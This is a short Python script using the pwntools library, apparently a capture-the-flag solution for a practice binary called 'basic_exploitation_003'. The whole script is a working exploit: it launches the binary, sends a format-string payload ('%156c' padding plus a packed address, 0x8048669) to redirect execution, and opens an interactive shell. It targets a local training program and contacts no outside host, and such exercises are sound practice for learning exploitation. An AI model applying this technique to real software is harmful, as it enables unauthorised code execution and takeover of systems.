from pwn import *

r = process('./basic_exploitation_003')

shell_addr = 0x8048669

r.sendline(b'%156c' + p32(shell_addr))
r.interactive()
